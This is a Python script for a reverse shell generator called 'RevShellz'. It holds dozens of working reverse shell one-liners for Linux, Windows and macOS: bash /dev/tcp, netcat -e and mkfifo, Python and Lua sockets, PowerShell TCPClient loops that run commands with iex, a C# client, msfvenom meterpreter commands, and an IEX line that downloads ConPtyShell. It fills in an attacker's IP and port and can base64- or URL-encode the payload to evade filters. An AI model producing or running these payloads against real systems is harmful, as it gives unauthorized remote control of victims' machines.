#!/usr/bin/env python3

import os
import argparse
import base64
import urllib.parse
import sys
import ipaddress

banner = """


   _ \                  ___|   |            |  |
  |   |   _ \ \ \   / \___ \   __ \    _ \  |  | _  /
  __ <    __/  \ \ /        |  | | |   __/  |  |   /
 _| \_\ \___|   \_/   _____/  _| |_| \___| _| _| ___|v2.0
                            mkdirlove & veilwr4ith
"""

payloads = {
    'linux': {
        'bash -i': 'bash -i >& /dev/tcp/{}/{} 0>&1',
        'sh -i tcp': 'sh -i >& /dev/tcp/{}/{} 0>&1',
        'sh -i udp': 'sh -i >& /dev/udp/{}/{} 0>&1',
        'bash 196': '0<&196;exec 196<>/dev/tcp/{}/{}; sh <&196 >&196 2>&196',
        'bash read line': 'exec 5<>/dev/tcp/{}/{};cat <&5 | while read line; do $line 2>&5 >&5; done',
        'bash 5': 'bash -i 5<> /dev/tcp/{}/{} 0<&5 1>&5 2>&5',
        'nc mkfifo': 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {0} {1} >/tmp/f',
        'nc -e': 'nc -e /bin/sh {0} {1}',
        'nc -c': 'nc -c /bin/sh {0} {1}',
        'ncat -e': 'ncat {0} {1} -e /bin/sh',
        'python -c': 'python -c "import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\'{0}\',{1}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\'/bin/sh\')"',
        'python -c shortened': 'python -c \'a=__import__;s=a("socket");o=a("os").dup2;p=a("pty").spawn;c=s.socket(s.AF_INET,s.SOCK_STREAM);c.connect((\'{0}\',{1}));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p("/bin/sh")\'',
        'lua -e': 'lua -e "require(\'socket\');require(\'os\');t=socket.tcp();t:connect(\'{0}\',\'{1}\');os.execute(\'/bin/sh -i <&3 >&3 2>&3\');"',
        'msfvenom -p elf': 'msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={} LPORT={} -f elf > shell.elf',
    },
    'windows': {
        'nc.exe -e': 'nc.exe -e cmd.exe {} {}',
        'ncat.exe -e': 'ncat.exe -e cmd.exe {} {}',
        'powershell #1': 'powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{0}",{1});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}}; $client.Close()',
        'powershell #2': 'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(\'{0}\',{1});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII.GetBytes($sendback2));$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"',
        'powershell #3': 'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(\'{0}\',{1});$stream = $client.GetStream();$writer = new-object System.IO.StreamWriter($stream);$buffer = new-object System.Byte[] 1024;$encoding = new-object System.Text.AsciiEncoding;$writer.Write([System.Text.Encoding]::ASCII.GetBytes((Get-Location).Path + \'> \'));$writer.Flush();while(($i = $stream.Read($buffer, 0, 1024)) -ne 0){{; $data = $encoding.GetString($buffer,0, $i); $sendback = (iex $data 2>&1 | Out-String ); $writer.Write([System.Text.Encoding]::ASCII.GetBytes($sendback)); $writer.Write([System.Text.Encoding]::ASCII.GetBytes((Get-Location).Path + \'> \')); $writer.Flush()}}; $client.Close()"',
        'powershell #4 (TLS)': 'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(\'{0}\',{1});$stream = $client.GetStream();$sslStream = New-Object System.Net.Security.SslStream($stream,$false,({$true} -as [Net.Security.RemoteCertificateValidationCallback]));$sslStream.AuthenticateAsClient(\'localhost\');$writer = new-object System.IO.StreamWriter($sslStream);$buffer = new-object System.Byte[] 1024;$encoding = new-object System.Text.AsciiEncoding;$writer.Write([System.Text.Encoding]::ASCII.GetBytes((Get-Location).Path + \'> \'));$writer.Flush();while(($i = $sslStream.Read($buffer, 0, 1024)) -ne 0){{; $data = $encoding.GetString($buffer,0, $i); $sendback = (iex $data 2>&1 | Out-String ); $writer.Write([System.Text.Encoding]::ASCII.GetBytes($sendback)); $writer.Write([System.Text.Encoding]::ASCII.GetBytes((Get-Location).Path + \'> \')); $writer.Flush()}}; $client.Close()"',
        'c# bash -i': '''using System;using System.Diagnostics;using System.Net.Sockets;using System.Text;class Program{static void Main(string[] args){using(TcpClient client = new TcpClient("{0}", {1})){using(NetworkStream stream = client.GetStream()){using(StreamReader reader = new StreamReader(stream, Encoding.ASCII)){using(StreamWriter writer = new StreamWriter(stream, Encoding.ASCII)){writer.AutoFlush = true;string inputLine;Process process = new Process();process.StartInfo.FileName = "cmd.exe";process.StartInfo.UseShellExecute = false;process.StartInfo.RedirectStandardOutput = true;process.StartInfo.RedirectStandardInput = true;process.Start();while ((inputLine = reader.ReadLine()) != null){process.StandardInput.WriteLine(inputLine);}}}}}}}}''',
        'python3 -c': 'python3 -c "import socket,os,threading,subprocess as sp;p=sp.Popen([\'cmd.exe\'],stdin=sp.PIPE,stdout=sp.PIPE,stderr=sp.STDOUT);s=socket.socket();s.connect((\'{0}\', {1}));threading.Thread(target=exec,args=(\'while(True):o=os.read(p.stdout.fileno(),1024);s.send(o)\',globals()),daemon=True).start();threading.Thread(target=exec,args=(\'while(True):i=s.recv(1024);os.write(p.stdin.fileno(),i)\',globals())).start()"',
        'lua5.1 -e': 'lua5.1 -e \'local host, port = "{0}", {1} local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port) while true do local cmd, status, partial = tcp:receive() if cmd then local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end end tcp:close()\'',
        'conpty': 'IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell {} {}',
        'msfvenom -p exe': 'msfvenom -p windows/meterpreter/reverse_tcp LHOST={} LPORT={} -f exe > shell.exe',
        'msfvenom -p asp': 'msfvenom -p windows/meterpreter/reverse_tcp LHOST={} LPORT={} -f asp > shell.asp',
    },
    'macos': {
        'bash -i': 'bash -i >& /dev/tcp/{}/{} 0>&1',
        'sh -i': 'sh -i >& /dev/tcp/{}/{} 0>&1',
        'bash 196': '0<&196;exec 196<>/dev/tcp/{}/{}; sh <&196 >&196 2>&196',
        'bash read line': 'exec 5<>/dev/tcp/{}/{};cat <&5 | while read line; do $line 2>&5 >&5; done',
        'bash 5': 'bash -i 5<> /dev/tcp/{}/{} 0<&5 1>&5 2>&5',
        'nc mkfifo': 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {0} {1} >/tmp/f',
        'nc -e': 'nc -e /bin/sh {0} {1}',
        'nc -c': 'nc -c /bin/sh {0} {1}',
        'ncat -e': 'ncat {0} {1} -e /bin/sh',
    }
}

"""
Validate IP Address
"""
def is_valid_ip(ip):
    try:
        ipaddress.ip_address(ip)
        return True
    except ValueError:
        return False

"""
Validate Port
"""
def is_valid_port(port):
    return 0<= port <= 65535

"""List available reverse shell types for the specified OS."""
def list_reverse_shells(os_category):
    if os_category in payloads:
        print(f"Available reverse shell types for {os_category.capitalize()}:")
        for shell_type in payloads[os_category]:
            print(f"- {shell_type}")
    else:
        print(f"Invalid OS category: {os_category}")

"""Generate and print the reverse shell command with optional obfuscation and URL encoding."""
def generate_reverse_shells(ip, port, os_category, shell_type, encode=False):
    if not is_valid_ip(ip):
        print(f"[-] Invalid IP address: {ip}")
        return
    if not is_valid_port(port):
        print(f"[-] Invalid port number: {port}. It should be between 0 and 65535.")
        return
    if os_category in payloads and shell_type in payloads[os_category]:
        shell_command = payloads[os_category][shell_type].format(ip, port)
        if encode == 'base64':
            shell_command = base64.b64encode(shell_command.encode()).decode()
            shell_command = f"echo {shell_command} | base64 -d | bash"
        elif encode == 'url':
            shell_command = urllib.parse.quote(shell_command)
        else:
            encode = 'None'
        print("[+] Payload Generated:")
        print("-" * 40)
        print(f" IP Address     : {ip}")
        print(f" Port           : {port}")
        print(f" OS Category    : {os_category.capitalize()}")
        print(f" Shell Type     : {shell_type}")
        print(f" Encoding       : {encode.capitalize()}")
        print("-" * 40)
        print(f"{shell_command}")
        print("-" * 40)
    else:
        print(f"[-] Invalid OS category or shell type: {os_category} - {shell_type}")

"""Main function"""
def main():
    print(banner)
    parser = argparse.ArgumentParser(description="RevShellz: Yet another reverse shell generator written in Python.")
    parser.add_argument('-ip', '--ipaddress', type=str, help='Target IP address')
    parser.add_argument('-p', '--port', type=int, help='Target port number')
    parser.add_argument('-os', '--operating-system', type=str, help='Target operating system (linux, windows, macos)')
    parser.add_argument('-pl', '--payload', type=str, help='Payload for reverse shell')
    parser.add_argument('-l', '--list', type=str, help='List available reverse shell payload types for the specified OS')
    parser.add_argument('-enc', '--encode', type=str, help='Encode the payload in Base64 or URL')
    args = parser.parse_args()
    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)
    if args.operating_system and args.payload and not args.port and not args.ipaddress or args.ipaddress and args.operating_system and args.payload and not args.port or args.operating_system and args.payload and args.port and not args.ipaddress:
        print("[-] Specify the Port and IP Address")
        sys.exit(1)
    if args.payload and not args.operating_system or args.operating_system and not args.payload:
        print("[-] Specify the Operating System or the Payload")
        sys.exit(1)
    if args.list:
        list_reverse_shells(args.list.lower())
        return
    generate_reverse_shells(args.ipaddress, args.port, args.operating_system, args.payload, args.encode)

if __name__ == '__main__':
    main()

